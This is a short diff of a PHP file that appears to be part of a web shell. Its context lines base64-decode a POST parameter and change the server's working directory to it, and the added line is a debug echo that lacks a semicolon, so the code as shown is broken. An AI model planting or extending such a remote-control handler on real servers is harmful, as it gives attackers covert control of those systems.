@@ -6,6 +6,8 @@ function pb64($data, $sep = True) {
         print(":");
 }
 
+echo "test"
+
 if (isset($_POST['chdir']) && !chdir(base64_decode($_POST['chdir']))) {
     pb64("Error: Unable to change directory to " . base64_decode($_POST['chdir']), False);
     http_response_code(202);
